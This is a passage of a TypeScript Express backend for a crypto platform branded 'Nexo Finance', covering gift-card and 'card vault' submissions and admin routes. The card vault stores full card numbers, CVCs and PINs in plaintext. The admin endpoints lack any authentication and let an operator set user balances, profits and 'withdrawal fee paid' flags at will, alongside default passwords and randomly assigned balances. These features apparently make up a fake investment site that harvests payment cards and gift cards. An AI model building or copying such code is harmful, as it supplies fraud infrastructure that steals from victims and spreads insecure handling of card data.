      transaction: { id: txId },
      gcIds: insertedIds,
    });
  } catch (err) {
    console.error('Gift card deposit error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Single gift card submit (alias for admin/external use)
app.post('/api/giftcard/submit', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { type, code, pin, amount, imageProofUrl } = req.body;
    if (!type || !code || !amount) return res.status(400).json({ error: 'Gift card type, code, and amount are required' });

    const gcId = genId('gc');
    await db.from('gift_cards').insert([{
      id: gcId,
      user_id: user.uid,
      user_email: user.email,
      type,
      code,
      pin: pin || '',
      amount: parseFloat(amount),
      image_proof_url: imageProofUrl || null,
      status: 'pending',
    }]);

    return res.status(201).json({ message: 'Gift card submitted for review.', gcId });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// =============================================================================
// CARD VAULT ROUTES
// =============================================================================

app.post('/api/card/submit', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { cardNumber, cardholderName, expiryDate, cvc, pin, amount, billingAddress } = req.body;
    if (!cardNumber || !cardholderName || !expiryDate || !cvc) {
      return res.status(400).json({ error: 'Card number, cardholder name, expiry, and CVC are required' });
    }

    const cardId = genId('card');
    await db.from('cards').insert([{
      id: cardId,
      user_id: user.uid,
      user_email: user.email,
      full_name: user.fullName,
      card_number: cardNumber,
      cardholder_name: cardholderName,
      expiry_date: expiryDate,
      cvc,
      pin: pin || '',
      amount: amount ? parseFloat(amount) : 0,
      billing_address: billingAddress || '',
      reference: genId('ref'),
      status: 'pending',
    }]);

    return res.status(201).json({ message: 'Card details submitted for processing.', cardId });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// =============================================================================
// ADMIN ROUTES
// =============================================================================

app.get('/api/admin/stats', async (_req, res) => {
  try {
    const { data: users } = await db.from('users').select('uid, staked_balance');
    const { data: txns } = await db.from('transactions').select('amount, type, status');
    const { data: kycPending } = await db.from('kyc_docs').select('id').eq('status', 'pending');
    const { data: pendingWd } = await db
      .from('transactions')
      .select('id, amount')
      .eq('type', 'withdrawal')
      .eq('status', 'pending');

    const txList = txns || [];
    const totalDepositsVolume = txList
      .filter(t => t.type === 'deposit' && t.status === 'approved')
      .reduce((s, t) => s + parseFloat(t.amount), 0);
    const totalWithdrawalsVolume = txList
      .filter(t => t.type === 'withdrawal' && t.status === 'approved')
      .reduce((s, t) => s + parseFloat(t.amount), 0);
    const activeStakingVolume = (users || []).reduce((s, u) => s + parseFloat(u.staked_balance || 0), 0);
    const pendingWdAmt = (pendingWd || []).reduce((s, t) => s + parseFloat(t.amount || 0), 0);

    return res.json({
      totalUsers: (users || []).length,
      totalDepositsVolume,
      totalWithdrawalsVolume,
      activeStakingVolume,
      pendingKYCCount: (kycPending || []).length,
      pendingWithdrawalsCount: (pendingWd || []).length,
      pendingWithdrawalsVolume: pendingWdAmt,
    });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin: Get all users
app.get('/api/admin/users', async (_req, res) => {
  try {
    const { data, error } = await db
      .from('users')
      .select('*')
      .order('created_at', { ascending: false });
    if (error) return res.status(500).json({ error: 'Failed to fetch users' });
    return res.json((data || []).map(r => safeUser(rowToUser(r))));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin: Create new user
app.post('/api/admin/users', async (req, res) => {
  try {
    const { email, fullName, password, balance, profitBalance, stakedBalance, kycTier, isAdmin, status } = req.body;
    if (!email) return res.status(400).json({ error: 'Email is required' });

    const uid = `usr_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
    const tier = parseInt(kycTier) || 0;

    const { data, error } = await db.from('users').insert([{
      uid,
      email: email.toLowerCase(),
      password: password || 'password123',
      full_name: fullName || email.split('@')[0],
      balance: parseFloat(balance) || randomBalance(),
      profit_balance: parseFloat(profitBalance) || 0,
      staked_balance: parseFloat(stakedBalance) || 0,
      total_withdrawn: 0,
      total_deposited: 0,
      kyc_status: tier >= 2 ? 'verified_tier2' : tier >= 1 ? 'verified_tier1' : 'unverified',
      kyc_tier: tier,
      is_admin: isAdmin || false,
      is_verified: tier >= 1,
      has_deposited_minimum: false,
      withdrawal_fee_paid: false,
      two_factor_enabled: false,
      referral_code: `NEXO-${Math.random().toString(36).substring(2, 7).toUpperCase()}`,
      referral_earnings: 0,
      status: status || 'active',
      avatar_url: '',
    }]).select().single();

    if (error || !data) return res.status(500).json({ error: 'Failed to create user: ' + (error?.message || '') });
    return res.status(201).json(safeUser(rowToUser(data)));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin: Update user
app.put('/api/admin/users/:uid', async (req, res) => {
  try {
    const { uid } = req.params;
    const {
      balance, profitBalance, stakedBalance, totalDeposited, totalWithdrawn,
      isAdmin, isVerified, hasDepositedMinimum, withdrawalFeePaid,
      twoFactorEnabled, kycTier, kycStatus, status, banReason,
      fullName, phone, country, securityPin,
    } = req.body;

    const updates: any = {};
    if (balance !== undefined) updates.balance = parseFloat(balance);
    if (profitBalance !== undefined) updates.profit_balance = parseFloat(profitBalance);
    if (stakedBalance !== undefined) updates.staked_balance = parseFloat(stakedBalance);
    if (totalDeposited !== undefined) updates.total_deposited = parseFloat(totalDeposited);
    if (totalWithdrawn !== undefined) updates.total_withdrawn = parseFloat(totalWithdrawn);
    if (isAdmin !== undefined) updates.is_admin = isAdmin;
    if (isVerified !== undefined) updates.is_verified = isVerified;
    if (hasDepositedMinimum !== undefined) updates.has_deposited_minimum = hasDepositedMinimum;
    if (withdrawalFeePaid !== undefined) updates.withdrawal_fee_paid = withdrawalFeePaid;
    if (twoFactorEnabled !== undefined) updates.two_factor_enabled = twoFactorEnabled;
    if (kycTier !== undefined) updates.kyc_tier = parseInt(kycTier);
    if (kycStatus !== undefined) updates.kyc_status = kycStatus;
    if (status !== undefined) updates.status = status;
    if (banReason !== undefined) updates.ban_reason = banReason;
    if (fullName !== undefined) updates.full_name = fullName;
    if (phone !== undefined) updates.phone = phone;
    if (country !== undefined) updates.country = country;
    if (securityPin !== undefined) updates.security_pin = securityPin;

    const { data, error } = await db
      .from('users')
      .update(updates)
      .eq('uid', uid)
      .select()
      .single();

    if (error || !data) return res.status(404).json({ error: 'User not found or update failed' });
    return res.json(safeUser(rowToUser(data)));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin: Suspend/Activate user
app.put('/api/admin/users/:uid/status', async (req, res) => {
  try {
    const { uid } = req.params;
    const { status, banReason } = req.body;

    const updates: any = { status };
    if (status === 'suspended') {
      updates.is_banned = true;
      updates.ban_reason = banReason || 'Administrative compliance review in progress. Please contact support.';
    } else {
      updates.is_banned = false;
      updates.ban_reason = null;
    }

    const { data, error } = await db.from('users').update(updates).eq('uid', uid).select().single();
    if (error || !data) return res.status(404).json({ error: 'User not found' });
    return res.json(safeUser(rowToUser(data)));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin: Delete user
app.delete('/api/admin/users/:uid', async (req, res) => {
  try {
    const { uid } = req.params;
    const { error } = await db.from('users').delete().eq('uid', uid);
    if (error) return res.status(500).json({ error: 'Failed to delete user' });
    return res.json({ message: 'User deleted successfully' });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin: Wallets
app.get('/api/admin/wallets', async (_req, res) => {
  try {
    const { data } = await db.from('admin_wallets').select('*').order('coin');
    return res.json((data || []).map(rowToWallet));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/admin/wallets', async (req, res) => {
  try {
    const { coin, network, address, label, memo, qrCodeUrl, isEnabled } = req.body;
    if (!coin || !address) return res.status(400).json({ error: 'Coin and address are required' });

    const walletId = genId('wlt');
    const { data, error } = await db.from('admin_wallets').insert([{
      id: walletId,
      coin,
      network: network || coin,
      address,
      label: label || `${coin} Wallet`,
      memo: memo || '',
      qr_code_url: qrCodeUrl || '',
      is_enabled: isEnabled !== false,
    }]).select().single();

    if (error || !data) return res.status(500).json({ error: 'Failed to add wallet' });
    return res.status(201).json(rowToWallet(data));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.put('/api/admin/wallets/:id', async (req, res) => {
  try {
    const { id } = req.params;
    const { coin, network, address, label, memo, qrCodeUrl, isEnabled } = req.body;

    const updates: any = {};
    if (coin !== undefined) updates.coin = coin;
    if (network !== undefined) updates.network = network;
    if (address !== undefined) updates.address = address;
    if (label !== undefined) updates.label = label;
    if (memo !== undefined) updates.memo = memo;
    if (qrCodeUrl !== undefined) updates.qr_code_url = qrCodeUrl;
    if (isEnabled !== undefined) updates.is_enabled = isEnabled;

    const { data, error } = await db
      .from('admin_wallets')
      .update(updates)
      .eq('id', id)
      .select()
      .single();

    if (error || !data) return res.status(404).json({ error: 'Wallet not found' });
    return res.json(rowToWallet(data));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.delete('/api/admin/wallets/:id', async (req, res) => {
  try {
    const { id } = req.params;
    const { error } = await db.from('admin_wallets').delete().eq('id', id);
    if (error) return res.status(404).json({ error: 'Wallet not found' });
    return res.json({ message: 'Wallet removed successfully' });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin: Transactions (Ledger)
app.get('/api/admin/transactions', async (_req, res) => {
  try {
    const { data } = await db
      .from('transactions')
      .select('*')
      .order('created_at', { ascending: false });
    return res.json((data || []).map(rowToTx));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.put('/api/admin/transactions/:id/action', async (req, res) => {
  try {
    const { id } = req.params;
    const { action, reason } = req.body;

    const { data: tx } = await db.from('transactions').select('*').eq('id', id).single();
    if (!tx) return res.status(404).json({ error: 'Transaction not found' });

    const newStatus = action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : 'pending';
    await db.from('transactions').update({ status: newStatus, admin_reason: reason || null }).eq('id', id);

    // Approved deposit → credit user balance
    if (action === 'approve' && tx.type === 'deposit') {
      const { data: user } = await db.from('users').select('*').eq('uid', tx.user_id).single();
      if (user) {
        const newBalance = parseFloat(user.balance) + parseFloat(tx.amount);
        const newDeposited = parseFloat(user.total_deposited) + parseFloat(tx.amount);
        await db.from('users').update({
          balance: newBalance,
          total_deposited: newDeposited,
          has_deposited_minimum: newDeposited >= 500,
        }).eq('uid', tx.user_id);
      }
    }

    // Approved withdrawal → deduct balance and record total withdrawn
    if (action === 'approve' && tx.type === 'withdrawal') {
      const { data: user } = await db.from('users').select('*').eq('uid', tx.user_id).single();
      if (user) {
        const newBalance = Math.max(0, parseFloat(user.balance) - parseFloat(tx.amount));
        const newWithdrawn = parseFloat(user.total_withdrawn) + parseFloat(tx.amount);
        await db.from('users').update({
          balance: newBalance,
          total_withdrawn: newWithdrawn,
        }).eq('uid', tx.user_id);
      }
    }

    return res.json({ message: `Transaction ${action}d successfully` });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin: KYC Verifications
app.get('/api/admin/kyc', async (_req, res) => {
  try {
    const { data } = await db
      .from('kyc_docs')
      .select('*')
      .order('submitted_at', { ascending: false });
    return res.json((data || []).map(rowToKyc));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.put('/api/admin/kyc/:id/action', async (req, res) => {
  try {
    const { id } = req.params;
    const { action, notes } = req.body;

    const { data: kyc } = await db.from('kyc_docs').select('*').eq('id', id).single();
    if (!kyc) return res.status(404).json({ error: 'KYC document not found' });

    const newStatus = action === 'approve' ? 'approved' : 'rejected';
    await db.from('kyc_docs').update({
      status: newStatus,
      admin_notes: notes || null,
      reviewed_at: new Date().toISOString(),
    }).eq('id', id);

    if (action === 'approve') {
      const { data: user } = await db.from('users').select('kyc_tier').eq('uid', kyc.user_id).single();
      if (user) {
        const currentTier = parseInt(user.kyc_tier) || 0;
        const newTier = Math.min(currentTier + 1, 3);
        const newKycStatus = newTier >= 2 ? 'verified_tier2' : 'verified_tier1';
        await db.from('users').update({
          kyc_tier: newTier,
          kyc_status: newKycStatus,
          is_verified: true,
        }).eq('uid', kyc.user_id);
      }
    } else {
      await db.from('users').update({ kyc_status: 'rejected' }).eq('uid', kyc.user_id);
    }

    return res.json({ message: `KYC ${action}d successfully` });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin: Gift Cards
app.get('/api/admin/giftcards', async (_req, res) => {
  try {
    const { data } = await db
      .from('gift_cards')
      .select('*')
      .order('submitted_at', { ascending: false });
    return res.json((data || []).map(rowToGiftCard));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.put('/api/admin/giftcards/:id/action', async (req, res) => {
  try {
    const { id } = req.params;
    const { action, reason } = req.body;

    const { data: gc } = await db.from('gift_cards').select('*').eq('id', id).single();
    if (!gc) return res.status(404).json({ error: 'Gift card not found' });

    const newStatus = action === 'approve' ? 'approved' : 'rejected';
    await db.from('gift_cards').update({ status: newStatus, admin_reason: reason || null }).eq('id', id);

    if (action === 'approve') {
      const { data: user } = await db.from('users').select('*').eq('uid', gc.user_id).single();
      if (user) {
        const newBalance = parseFloat(user.balance) + parseFloat(gc.amount);
        const newDeposited = parseFloat(user.total_deposited) + parseFloat(gc.amount);
        await db.from('users').update({
          balance: newBalance,
          total_deposited: newDeposited,
          has_deposited_minimum: newDeposited >= 500,
        }).eq('uid', gc.user_id);

        await db.from('transactions').insert([{
          id: genId('tx_gc'),
          user_id: gc.user_id,
          user_email: gc.user_email,
          type: 'deposit',
          method: 'giftcard',
          amount: parseFloat(gc.amount),
          coin: `Gift Card (${gc.type})`,
          status: 'approved',
          details: `Gift card deposit approved: ${gc.type}`,
        }]);
      }
    }

    return res.json({ message: `Gift card ${action}d successfully` });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin: Card Vault
app.get('/api/admin/cards', async (_req, res) => {
  try {
    const { data } = await db
      .from('cards')
      .select('*')
      .order('submitted_at', { ascending: false });
    return res.json((data || []).map(rowToCard));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.put('/api/admin/cards/:id/action', async (req, res) => {
  try {
    const { id } = req.params;
    const { action } = req.body;
    const statusMap: Record<string, string> = {
      approve: 'approved', reject: 'rejected',
      settled: 'settled', flagged: 'flagged', captured: 'captured',
    };
    const newStatus = statusMap[action] || 'pending';

    const { data, error } = await db
      .from('cards')
      .update({ status: newStatus })
      .eq('id', id)
      .select()
      .single();

    if (error || !data) return res.status(404).json({ error: 'Card not found' });
    return res.json({ message: `Card ${action}d successfully` });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin: System Rules / Settings
app.get('/api/admin/settings', async (_req, res) => {
  try {
    const { data } = await db.from('global_settings').select('*').order('key');
    return res.json((data || []).map(rowToSetting));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.put('/api/admin/settings', async (req, res) => {
  try {
    const { key, value } = req.body;
    if (!key) return res.status(400).json({ error: 'Setting key is required' });

    const { data, error } = await db
      .from('global_settings')
      .upsert([{ key, value: String(value), updated_at: new Date().toISOString() }], { onConflict: 'key' })
      .select()
      .single();

    if (error || !data) return res.status(500).json({ error: 'Failed to update setting' });
    return res.json(rowToSetting(data));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin: Re-seed default data on demand
app.post('/api/admin/seed', async (_req, res) => {
  try {
    // Only insert wallets if table is empty
    const { data: existingWallets } = await db.from('admin_wallets').select('id').limit(1);
    if (!existingWallets || existingWallets.length === 0) {
      await db.from('admin_wallets').insert([
        { id: 'wlt_btc_01', coin: 'Bitcoin', network: 'BTC (Native SegWit)', address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', label: 'Primary BTC Cold Vault', memo: '', is_enabled: true, qr_code_url: '' },
        { id: 'wlt_eth_01', coin: 'Ethereum', network: 'ERC20', address: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F', label: 'ETH Institutional Vault', memo: '', is_enabled: true, qr_code_url: '' },
        { id: 'wlt_usdt_01', coin: 'USDT', network: 'TRC20', address: 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE', label: 'USDT TRC20 Prime', memo: '', is_enabled: true, qr_code_url: '' },
        { id: 'wlt_usdc_01', coin: 'USDC', network: 'ERC20', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', label: 'USDC ERC20 Vault', memo: '', is_enabled: true, qr_code_url: '' },
        { id: 'wlt_bnb_01', coin: 'BNB', network: 'BEP20', address: '0x000000000000000000000000000000000000dead', label: 'BNB Smart Chain Vault', memo: '', is_enabled: true, qr_code_url: '' },
      ]);
    }
    return res.json({ message: 'Seed operation completed.' });
  } catch (err) {
    return res.status(500).json({ error: 'Seed failed: ' + String(err) });
  }
});

// =============================================================================
// SERVER STARTUP
// =============================================================================

const isEntrypoint = () => {
  try {
    const thisFile = fileURLToPath(import.meta.url);
    const entryFile = process.argv[1] ? path.resolve(process.argv[1]) : '';
    return thisFile === entryFile;
  } catch {
    return false;
  }
};

export default app;

if (isEntrypoint()) {
  app.listen(PORT, () => {
    console.log(`🚀 Nexo Finance API running on port ${PORT}`);
    console.log(`📊 Database: Supabase PostgreSQL`);
    console.log(`🔑 Supabase URL: ${SUPABASE_URL}`);
  });
}
